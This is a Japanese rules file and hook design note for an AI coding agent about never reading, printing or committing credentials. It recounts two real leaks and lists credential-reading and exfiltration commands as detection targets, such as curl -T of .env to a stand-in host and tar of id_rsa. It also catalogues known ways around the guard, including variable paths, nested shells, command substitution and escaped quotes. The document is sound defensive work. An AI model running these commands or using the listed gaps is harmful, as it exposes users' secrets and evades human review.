# 秘密の規律（資格情報を読まない・表示しない・持ち出さない）

> kit/loop の rules です。ペア: PreToolUse `pre-tool-secrets-guard`（資格情報を読む・中身を出す・版管理に入れる操作を
> `ask` で人に確認する）。SessionStart `session-start-rules` が「要点」を、UserPromptSubmit `user-prompt-rules` が
> 「毎ターンの要点」を注入します。hook 側に文言を複製しないでください。

## 毎ターンの要点
<!-- looptrack:inject prompt -->

[秘密の規律] 資格情報（トークン・パスワード・秘密鍵・TOTP のシークレット・`.env` の値）は読まない・表示しない・版管理に入れないでください。確かめるのは有無・長さ・ハッシュの先頭までです。出力は取り消せません。詳細は rules の secrets-discipline.md にあります。

## 要点
<!-- looptrack:inject session -->

- **資格情報の中身を読まない・表示しない・別の場所へ写さないでください。** 対象はアクセストークン・パスワード・秘密鍵・
  TOTP のシークレット・API キー・`.env` の値・クラウドの認証情報です。確かめたいことはたいてい
  **有無・長さ・ハッシュの先頭**で足ります（`wc -c`・`shasum | cut -c1-8`）。
- **出力は取り消せません。** 会話の記録・ログ・イシューのコメントに一度載った秘密は、後から消しても漏れたものとして扱います。
  「確認のため 1 回だけ」でも表示しないでください。
- **秘密をコマンドの引数に書きません**。シェルの履歴とプロセスの一覧に残るからです。ファイル（`chmod 600`）か標準入力で渡してください。
- **版管理に入れません。** `.env`・`credentials.json`・`*.p12` / `*.pem` / `*.key` は、`git add` の前に `.gitignore` に入れます。
  一度コミットすると、履歴から消すのは大変です。
- **人やサブエージェントに実機の確認を頼むときは、この禁止を指示にそのまま書いてください。** 認証情報の在りかを調べる作業では、
  頼まれた側が「中身を見せるのが親切」と考えがちです。

## なぜこれが要るか

AI に実機の確認（導入・ログイン・配布物の受け取り）を任せると、**認証情報の在りかを調べる途中で中身が出力に残ります**。
「どこにトークンがあるか」を調べる作業と「そのトークンの値を見る」作業はひと続きで、境目を意識しにくいからです。
実際に同じ日に 2 回起きました。1 度目は使い捨てのアクセストークンを出力に残しました。2 度目はキーチェーンの
読み出しコマンドの出力をそのまま表示し、利用者の本物の資格情報（別のサービスのものを含む）が記録に残りました。
どちらも外部には送っていませんが、失効と再認可の手間がかかりました。

## 漏れたと分かったら

1. **失効させます**（そのサービスの管理画面で。`looptrack` のアクセストークンは `/account` で失効できます）。消すより先に止めてください。
2. どの秘密が・いつ・どこ（会話の記録・ログ・コミット・イシュー）に残ったかを書き出します。
3. 利用者に**すぐ**伝えます。再ログインや再認可が要るものを具体的に挙げてください。
4. 同じ経路で繰り返さないよう、指示か規律に禁止として書き足します。

隠さないでください。黙って直すと、失効されないまま残ります。

## この規律と hook の関係

`pre-tool-secrets-guard` は次の操作を `ask`（拒否ではなく確認）にします。通すかどうかは人が決めます。

| 見るもの | 例 |
| -- | -- |
| 資格情報の保管庫の読み出し | `security find-generic-password`・`security dump-keychain`・`secret-tool lookup`・`cmdkey /list` |
| 秘密のファイルの中身を出す・別の場所へ写すコマンド | `cat`・`less`・`head`・`grep`・`jq`・`xxd`・`openssl`・`cp`・`mv`・`tee`・`scp`・`rsync` と、Windows / PowerShell の `type`・`Get-Content`・`findstr`・`Select-String`・`copy`・`Copy-Item` などの引数が `.env`・`credentials.json`・鍵 |
| 書庫に入れる・外へ送る・環境に入れるコマンド | `tar`・`zip`・`unzip`・`curl`・`wget`・`source` の引数が秘密のファイル |
| 入れ子のシェルの中身 | `bash -c '…'`・`sh -c "…"`・`eval "…"` の引用符の中で実行されるコマンド（1 段だけ） |
| 入力のリダイレクト | `< 秘密のファイル`（コマンド名に関わらず。`<<`・`<<<`・`<&3` は対象外） |
| 版管理への混入 | `git add` / `git commit` の対象が秘密のファイル |
| ツールからの読み書き | Read / Edit / Write の対象が秘密のファイル |

判定では**実際に実行される語**だけを見ます。引用符やヒアドキュメントの中に同じ**コマンド名**があっても反応しません
（`echo 'cat .env は禁止'` は通ります）。ただし**引用符の中身がまるごと 1 つのパスなら、そのパスは見ます**。
引用符はシェルに語を区切らせないために付けるものです（空白を含むパス・`$HOME` の展開）。そのため `cat "$HOME/.env"` は
`cat ~/.env` と同じ行為として確認します。文の中に名前が出てくるだけのもの（`git commit -m ".env を .gitignore に足した"`）は通ります。
コマンド名の前に実行ファイルのパスが付いていてもかまいません（`/bin/cat`・`C:\Windows\System32\findstr.exe`）。
大文字と小文字を区別しないのは**コマンドの位置にある語**だけです（`CAT .env` は確認します）。引数の位置にある**コマンド名**は区別します
（`go test -run Type … .env` には反応しません）。これはコマンド名の話で、**ファイル名と置き場は大小を区別しません**。
macOS と Windows のファイルシステムは大小を区別しません。`.ENV`・`ID_RSA`・`CREDENTIALS.JSON`・`SERVER.KEY`・
`secret.PEM`・`vault.ASC`・`cert.P12`・`~/.NETRC` は実在のファイルを指すので、区別すると中身が本当に出てしまいます。
置き場も同じで、`Private/`・`Secrets/`・`Keys/`・`.SSH/` も確認します。通す側（雛形と公開鍵）も大小を区別しません。
`.ENV.EXAMPLE`・`KEY.PUB` は通り、`cp .ENV.EXAMPLE .ENV` も通ります。
**秘密かどうかは名前と置き場で見分けます。** `.env`・`credentials.json`・`.netrc`・`.pgpass`・`.npmrc`・`.htpasswd`・
SSH の鍵（`id_` + 鍵の型。`rsa`・`dsa`・`ecdsa`・`ed25519`・`xmss`。`_sk` と後置の語を許す）・`.p12`・`.pfx`・`.p8`・`.jks`・`.keystore`・`.gpg` は名前だけで秘密として扱います。
**`.pem`・`.key`・`.asc` は無条件には秘密扱いしません**。公開の証明書鎖・CA 束・署名・書類のほうが多いからです。
**拡張子の無い `credentials` も無条件には秘密扱いしません**。英語のふつうの語で、grep の検索語や URL の一部として
日常的に出てくるからです。こちらは**置き場（次の 1.）だけ**で見て、名前の語（次の 2.）では見ません。
そのため `~/.aws/credentials` は確認し、`docs/credentials` や `grep -rn credentials src/` は通します。
これらを確認するのは、次のどちらかに当たるときだけです。

1. **置き場**: パスに `.ssh/`・`.gnupg/`・`.aws/`・`private/`・`secrets/`・`keys/`・`pki/`・`letsencrypt/` を含むとき。
   ただし **先頭の `/private/tmp/`・`/private/var/`・`/private/etc/` だけは外します**。macOS では `/tmp`・`/var`・`/etc` の
   実体がこの 3 つです。実パス（`realpath` の出力・一時ディレクトリ）を書くと必ず先頭に `private/` が付きます。
   そのままでは `/private/etc/ssl/cert.pem`（実在する公開の CA 束）のような公開のファイルまで確認になってしまいます。
   外すのは**先頭の 1 か所だけ**です。2 つ目以降の `private/` はこれまでどおり当たります
   （`/private/etc/ssl/private/server.key`・`/private/tmp/x/private/server.pem` は確認します）。
   ここでいう**「先頭」はパスの文字列の先頭 1 か所**のことで、「最初に出てくる `private/`」ではありません。つまり
   `/private/keys-archive/x.pem`（先頭だが子が `tmp|var|etc` でない）も `~/proj/private/tmp/x.pem`
   （`private/tmp/` だが先頭ではない。利用者自身の置き場）も**外れず、確認になります**。
   大小は無視するので `/PRIVATE/TMP/x.pem`・`/Private/tmp/x.pem` も外れます。macOS のファイルシステムは
   大小を区別せず、同じ実体を指すからです。**限界**: そのぶん、Linux で `/Private/tmp/` や `/private/etc/` を
   本当に秘密の置き場として作っている場合は拾えません。判定に環境の分岐を入れない方針なので、この限界は受け入れています。
2. **名前**: 拡張子を除いた部分に、秘密を名乗る語が**語として**出てくるとき（`server`・`client`・`host`・`domain`・`site`・
   `privkey`・`private`・`priv`・`key`・`tls`・`ssl`・`id`・`secret`・`master`・`encryption`・`ca`・`rootca`・`root`・
   `signing`・`sign`・`deploy`・`vault`・`backup`・`token`・`credential(s)`・`encrypt`・`encrypted`）。語の境界は先頭・末尾と `.` `_` `-` です。
   `design.pem`（`sign`）・`pubkey.pem`（`key`）・`cacert.pem`（`ca`）のような**語の途中の一致では当たりません**。

公開のものを名乗る語（`fullchain`・`chain`・`bundle`・`intermediate`・`cert`・`certificate`・`cacert`・`pubkey`・`public`）は、
**秘密の語より先には見ません**。先に見ると `cert` を 1 つ足すだけで `private`・`secret`・`vault` が無効になり、
`client-cert.pem`・`secret.cert.pem` のような**本物の秘密が通ってしまいます**。公開の語の使い道は次の 2 つだけです。

- **拡張子が `.key` のとき**: `.key` は鍵そのものを名乗る拡張子なので、**公開の語も秘密の側に数えます**
  （`cert.key`・`tls-chain.key`・`ca-cert.key` は TLS の秘密鍵）。通るのは `slides.key` のように、どちらの語も持たない書類だけです。
- **拡張子が `.pem` / `.asc` のとき**: 公開の語があれば、重なりやすい語を秘密の語から外します。ただし**外すのは片方だけです**。
  - `public`・`pubkey` があるとき → **`key` だけ**外します（`public-key.asc`・`pubkey-bundle.pem` は公開鍵）。`ca` は外さないので
    `pubkey-ca-key.pem`（CA の鍵）は確認します。
  - ほかの公開の語（`cert`・`chain`・`bundle`・`intermediate`・`certificate`・`fullchain`・`cacert`）のとき → **`ca` だけ**外します
    （`ca-bundle.pem`・`intermediate-ca.pem` は公開の CA 束）。**`key` は外しません**。`key-cert.pem`・`cert-key.pem`・
    `ca-key-bundle.pem`（CA の秘密鍵）・`key-chain.pem` は**確認します**。ここで両方まとめて外すと、
    `cert` を 1 つ足すだけで本物の秘密鍵が通ってしまいます。
  - 語の組み合わせで見るので、`ca-bundle-2026.pem`・`CA-KEY-BUNDLE.pem` のような変形（大小を含む）にも効きます。
    `private`・`secret`・`vault` などは外れないので、確認のままです。
- **区切りの無い合成語**（`.pem`・`.key`・`.asc` に限る）: 語の境界だけで見ると `privatekey` は 1 語です。
  `private` にも `key` にも当たりません。そこで**合成語の中に `key` を含む語**も確認します
  （`privatekey.pem`・`keypair.pem`（鍵対の既定の名前）・`secretkey.pem`・`serverkey.pem`・`sshkey.pem`・
  `apikey.pem`・`signingkey.asc`・`mykey.pem`・`ec2keypair.pem`）。通すのは**まるごと公開鍵を名乗る語**だけです
  （`pubkey`・`publickey`・`pubkeys`・`publickeys`・`pubkeyring`。例は
  `publickey.pem`・`pubkey.pem`・`pubkeyring.asc`・`pubkey-bundle.pem`）。**`pub` で始まるだけでは通しません**。
  後ろに秘密の語が続く 1 語（`pubprivatekey.pem`・`pubsecretkey.pem`・`publicprivatekey.pem`・`pubserverkey.asc`）は**確認します**。
  区切りのある `pubkey-privatekey.pem` と結果をそろえるためです（以前は区切りを外すだけで判定が変わっていました）。

置き場が 1 に当たるときは、名前に関わらず確認します。

例: **確認する** — `cert.key`（TLS の秘密鍵でいちばんよくある名前）・`key-cert.pem`・`cert-key.pem`・
`ca-key-bundle.pem`（CA の秘密鍵）・`key-chain.pem`・`pubkey-ca-key.pem`・`client-cert.pem`・`private-cert.pem`・
`secret.cert.pem`・`privkey-bundle.pem`・`vault-bundle.pem`・`master-chain.key`・`ca-cert.key`・`ca.key`・
`rootCA.key`・`deploy_key.pem`・`jwt-signing.pem`・`vault.asc`・`gpg-backup.asc`。
**通る** — `fullchain.pem`・`ca-bundle.pem`・`chain.pem`・`intermediate.pem`・`intermediate-ca.pem`・`cert.pem`・
`cacert.pem`・`ca-cert.pem`・`pubkey.pem`・`public-key.asc`・`public.asc`・`release.tar.gz.asc`（リリースの署名）・
`slides.key`（書類）・`id_token`。
**`.asc` は、名前が秘密を名乗らない限りほとんどが通ります**。署名と公開鍵が大半だからです。
**限界**: 秘密の語も `key` も名前に無く、置き場も慣習から外れていると（`notes/2026.pem` など）**捕まりません**。
`privatekey.pem`・`pubkey-sshkey.pem` のような合成語は上の規則で拾います。**ただし名前で見分ける方式の限界が
無くなったわけではありません**。ここに挙げた形は実際に確かめたものにすぎず、網羅を保証するものではありません。
逆に、確認する側に倒れるものが 2 つあります。誤発火ではありますが、秘密を通すよりは安全な側です。
`public` と `ca` が同居する公開の名前（`public-ca-bundle.pem`）と、`key` をたまたま含む語（`monkey.pem`）です。
名前で見分ける方式の限界で、hook はうっかりミスを捕まえるだけという位置づけの範囲に収まっています。
名前が似ていても秘密でないもの（`.env.example`・`*.pub`）は通します。
**雛形からの複写は通します**（`cp .env.example .env`）。判断は `;`・`&`・`&&`・`||`・`|`・改行・`(`・`)` で区切った**単純コマンドごと**です。
通るのは、**そのコマンドの複写元が雛形で、そのコマンドの秘密のパスがそれ 1 つだけ**のときです。ほかのコマンドはふだんどおり判定します。
`cp .env.example .env; cat .env`・`cp .env.example /tmp/t && cat ~/.ssh/id_rsa` は確認します。
`cp .env .env.bak`・`mv .env /tmp/`・`tee .env < .env.example`・`cp .env /tmp/.env.example` も確認します。
**引用符が閉じていないコマンドは区切りを信用できないので、雛形の例外を一切使いません**（確認する側に倒します）。
**入れ子のシェルをほどくと単純コマンドが 1 つ増えます**。そのため `bash -c 'cp .env.example' .env` のように
**複写元と複写先が別のコマンドに分かれるわざとらしい形では、雛形の例外が外れて確認になります**（実測）。
`ask` は拒否ではなく確認で、害は確認が 1 回増えるだけです。なのでこれは許容すると決めました
（`cp .env.example .env` そのものは通ります）。
例外は `LOOPTRACK_LOOP_SECRETS_ALLOW`（空白区切り）で指定します。**パスごとに**見て、当たったパスだけを除きます。
許可したパスが 1 つあっても、同じ行にある許可外の秘密はそのまま確認の対象です。

### 捕まえるようになったもの

捕まえる側として挙げた実例は、すべてテストで固定してあります。通す側として挙げた例もテストで固定してあります。
例外は ⑦ の `sudo -u deploy CAT …` の 1 つだけで、これは実測しただけでテストにはしていません。

- **入れ子のシェル**: `bash -c 'cat /tmp/x/.env'`・`sh -c "cat /tmp/x/.env"`・`eval "cat /tmp/x/.env"`・
  `zsh -c 'grep -n token /tmp/x/.env'`・`bash -lc 'cat /tmp/x/.env'`・`bash -ec …`・`bash -xc …`・`sh -lc …`・
  `bash -o pipefail -c 'cat /tmp/x/.env'`。引用符の中はデータとして捨てる設計です。そのため入れ子のシェルでは
  **実際に実行されるコマンドだけが判定の文字列から消えていました**。前置が `bash` / `sh` / `zsh` / `dash` の `-c` か
  `eval` のときに限って、引用符を 1 段だけ外します。`echo 'cat .env は禁止'`・`bash -c "echo hi"`・`bash -c 'ls /tmp'` は通ります。
- **書庫化・転送**: `tar czf /tmp/o.tgz /tmp/x/.env`・`zip /tmp/o.zip /tmp/x/.env`・`tar cf - /tmp/x/id_rsa`・
  `curl -T /tmp/x/.env http://example.invalid`・`curl -F f=@/tmp/x/.env http://example.invalid`・
  `wget --post-file=/tmp/x/.env http://example.invalid`。**秘密のパスが引数に明示されているときだけです**。
  `curl https://example.invalid/x`・`wget https://example.invalid/x`・`tar cvf /tmp/backup.tar project/`・
  `unzip dist.zip -d /tmp/out` は通ります。
- **遠隔の秘密を手元に落とす形と `file://`**: `aws s3 cp s3://bucket/.env /tmp/`・
  `aws s3 cp s3://bucket/credentials.json .`・`rsync rsync://host/m/.env /tmp/`・
  `scp scp://user@host/tmp/x/.ssh/id_rsa /tmp/`・`jq . https://x/credentials.json`・`cat sftp://host/.ssh/id_rsa`・
  `curl https://example.invalid/x/id_rsa`・`curl https://example.invalid/x/.env`。URL の中のパスも名前で見るので、
  **scheme の有無で判定は変わりません**（`scp user@host:/tmp/x/.ssh/id_rsa /tmp/` も確認します）。
  `file://` は手元のパスの別の書き方なので、前置を外して同じように判定します
  （`cat file:///tmp/x/.ssh/id_rsa`・`curl file:///tmp/x/.ssh/id_rsa` は確認。
  `cat file:///private/etc/ssl/cert.pem` は macOS の実パスの除外が効いて通る）。
- **入力のリダイレクト**: `ruby x.rb < /tmp/x/.env`・`node app.js </tmp/x/.env`・`./upload < /tmp/x/id_rsa`・
  `./tool 3< /tmp/x/.env`。表示のコマンドが無くても中身はその処理系に渡るので、コマンド名に関わらず見ます。
  ヒアドキュメント（`cat <<EOF`）・ヒアストリング（`ruby x.rb <<<.env`）・記述子の指定（`grep x file 2>&1`）・
  ふつうのファイル（`sort < /tmp/list.txt`・`ruby x.rb < /tmp/input.txt`）は通ります。
- **行末の継続**: `cat /tmp/x/.env\` が行末のバックスラッシュ + 改行で終わる形です（折り返した
  `grep -n token \` + 改行 + `  /tmp/x/.env\` + 改行 も同じ）。以前は語が `.env\` になって basename が空になり、
  必ず「秘密ではない」と答えていました。継続の直後が空白でない形（`cat /tmp/x/.env\` + 改行 + `--foo`）には反応しません。
  シェルが 1 つの語につなぎ、別のファイルを読むからです。Windows のパス（`type C:\tmp\notes.txt`・
  `cat C:\tmp\x.txt`）は壊れません。
- **クラウドの認証情報**: **秘密の置き場の中にある**拡張子の無い `credentials`（`cat /tmp/x/.aws/credentials`・
  `cp /tmp/x/.aws/credentials /tmp/`・`source /tmp/x/.aws/credentials`・`cat /tmp/x/secrets/credentials`）と、
  置き場としての `.aws/`（`cat /tmp/x/.aws/notes2026.pem`）です。`credentials.json` はこれまでどおり名前だけで秘密です。
  **置き場が秘密でなければ通ります**（`cat /tmp/x/credentials`・`sed -n '1,5p' docs/credentials`・
  `grep -rn credentials src/`・`git grep credentials`・`jq .credentials /tmp/a.json`・
  `curl -o /tmp/credentials https://example.invalid/x`）。`cat /tmp/x/.aws/config`（設定であって資格情報ではない）・
  `credentials.md`・`credentials.txt`（文書の拡張子）も通ります。
- **`source`**: `source /tmp/x/.env`・`cd app && source .env`・`SOURCE /tmp/x/.env`。表示はしませんが、値が環境に入ります。
  `source /tmp/x/venv/bin/activate`・`source /tmp/x/.bashrc` は通ります。
- **前置の語の直後の大文字**: `xargs CAT /tmp/x/.env`・`sudo CAT …`・`env CAT …`・`nohup CAT …`・`time CAT …`・
  `command CAT …`・`timeout 30 GET-CONTENT /tmp/x/.env`・`env FOO=1 TYPE /tmp/x/.env`
  （macOS では `CAT` が `/bin/cat` として実際に実行され、中身が出ます）。前置の語は `sudo`・`doas`・`env`・`xargs`・
  `nohup`・`setsid`・`time`・`command`・`nice`・`stdbuf`・`timeout` です。**広げたのはその直後だけ**なので、引数の位置の語
  （`go test -run Type … .env`・`npm run copy:env .env`・`npm run gc -- .env`）は通ります。
  値を別の語で取る選択肢（`sudo -u deploy CAT …`）は、前置として読み切れないので拾えません。

### 捕まえないもの（塞がないと決めたもの）

下はどれも**実測で確かめました**（確認になりません）。どれも「いずれ足す」ものではありません。

- **任意の処理系に秘密のパスを引数で渡す形**: `ruby -e '...' /tmp/x/.env`・`node -e '...' /tmp/x/.env`。
  **捕まらない理由**: 判定は「実行される語」を正規表現で見る設計で、`ruby`・`node` は中身を出すコマンドではないからです。
  **`ruby`・`node` を語として足す道は採りません。** 日常的に使う語なので、足せば誤発火が当たり前になります。
  人が確認を読まずに通すようになり、ガードは形だけになって、塞ぐ前より悪くなります。
- **変数でパスを組む形**: `D=/tmp/x/; cat $D.env`。展開した後の文字列は hook には見えません。
- **名前を伏せるグロブ**: `cat /tmp/x/*`・`cat /tmp/x/.en?`。文字どおりの部分が秘密を名乗っていません。
  **`cat /tmp/x/.env*`・`cat /tmp/x/id_rsa*` も捕まりません**（`.env*`・`id_rsa*` は名前の照合に当たらない）。
- **ディレクトリごと固める書庫化**: `tar czf /tmp/o.tgz .`。秘密のファイル名が引数に出てこないので、
  名前で見分ける方式では原理的に拾えません。
- **`.`（ドット）による読み込み**: `. /tmp/x/.env`。`.` は 1 文字なので、語として正規表現で扱うと
  どこで当たるかが読めず、誤発火を予測できません（`source` は足してあります）。
- **2 段以上の入れ子のシェル**: `bash -c "bash -c 'cat /tmp/x/.env'"`。引用符を外すのは
  **シェルの `-c` か `eval` に限って 1 段だけ**という設計どおりです。段を重ねて外すと、引用符の中のただの文で
  誤発火する形が増えます。
- **遠隔のシェルへ渡す形**: `ssh host 'cat /tmp/x/.env'`。遠隔の秘密が手元の記録に残る経路ではあります。
  ただ展開は**シェルの `-c` か `eval` に限り 1 段**という同じ設計で、`ssh` はそこに入れていません。
  **ただし `ssh host bash -c 'cat /tmp/x/.env'`・`docker run img bash -c '…'` のように `-c` の形で渡すと確認になります**
  （実測）。秘密のガードは**入れ子のシェルを位置を問わずほどく**ので、引数の位置にあっても当たります。
  `ask` なら人がその場で通せるので、広く当てて取りこぼしを減らす側に倒してあります
  （**`deny` で作業が止まる git ガードだけは、コマンドの位置に限っています**）。
- **URL のパスに `credentials` があるだけの形**: `curl https://example.invalid/v1/credentials`・
  `aws s3 cp s3://bucket/credentials /tmp/`・`curl -o /tmp/credentials https://example.invalid/x`・
  `git clone ssh://git@example.invalid/x/secrets.git`。拡張子の無い `credentials` は**置き場の中にあるときだけ**
  秘密として見るので、URL のパスに出てきても当たりません。
- **コマンド置換の中身（二重引用符の中の `$(…)` とバッククォート）**: `echo "$(cat /tmp/x/.ssh/id_rsa)"`・
  `` echo `cat /tmp/x/.env` ``。二重引用符の中はデータとして捨て、バッククォートは語の区切りに数えません。
  そのため、置換の中で実際に実行されるコマンドが判定の文字列から消えます。引用符の外の `$(…)`（`echo $(cat /tmp/x/.env)`）は
  `(` で区切るので確認します。
- **バックスラッシュで打ち消した引用符で挟む形**: `cp .env.example x\" ; cat /tmp/x/id_rsa \"`。
  引用符の中を捨てる段は `\"` も引用符の組として数えるので、その間のコマンドが判定の文字列から消えます。
  シェルにとってはこれは引用符ではなく、`cat` はそのまま実行されます。

hook が捕まえるのはうっかりミスだけで、規律の代わりにはなりません。名前で見分けられない秘密（作業中に作った一時ファイル・
出力に混ざった値）は捕まりません。
